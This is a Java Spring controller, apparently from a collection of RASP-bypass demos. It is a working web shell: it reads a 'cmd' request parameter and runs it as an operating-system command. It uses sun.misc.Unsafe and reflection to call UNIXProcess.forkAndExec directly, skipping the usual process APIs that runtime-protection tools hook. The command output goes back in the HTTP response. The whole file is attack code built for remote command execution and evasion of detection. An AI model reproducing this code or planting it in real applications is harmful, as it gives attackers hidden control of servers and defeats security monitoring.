package com.example.raspbypass.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import sun.misc.Unsafe;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

@Controller
@RequestMapping("/bypass5")
public class Bypass5 {

    @GetMapping("/")
    public void unsafe(HttpServletRequest request, HttpServletResponse response) throws Exception {

        String[] strs = request.getParameterValues("cmd");
        if (strs != null) {
            Unsafe unsafe = getUnsafe();
            Class processClass = null;
            processClass = Class.forName("java.lang.UNIXProcess");
            Object processObject = unsafe.allocateInstance(processClass);
            byte[][] args = new byte[strs.length - 1][];
            int size = args.length;
            for (int i = 0; i < args.length; i++) {
                args[i] = strs[i + 1].getBytes();
                size += args[i].length;
            }
            byte[] argBlock = new byte[size];
            int i = 0;
            for (byte[] arg : args) {
                System.arraycopy(arg, 0, argBlock, i, arg.length);
                i += arg.length + 1;
            }
            int[] envc = new int[1];
            int[] std_fds = new int[]{-1, -1, -1};
            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
            Field helperpathField = processClass.getDeclaredField("helperpath");
            launchMechanismField.setAccessible(true);
            helperpathField.setAccessible(true);
            Object launchMechanismObject = launchMechanismField.get(processObject);
            byte[] helperpathObject = (byte[]) helperpathField.get(processObject);
            int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class});
            forkMethod.setAccessible(true);
            int pid = (int) forkMethod.invoke(processObject, new Object[]{ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false});// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
            initStreamsMethod.setAccessible(true);
            initStreamsMethod.invoke(processObject, std_fds);
            Method getInputStreamMethod = processClass.getMethod("getInputStream");
            getInputStreamMethod.setAccessible(true);
            InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int a = 0;
            byte[] b = new byte[1024];
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }
            response.getWriter().write(baos.toString());
        }
    }

    byte[] toCString(String s) {
        if (s == null) {
            return null;
        }
        byte[] bytes = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    public static Unsafe getUnsafe() {
        Unsafe unsafe = null;
        try {
            Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (sun.misc.Unsafe) field.get(null);
            return unsafe;
        } catch (Exception e) {
            throw new AssertionError(e);
        }
    }
}
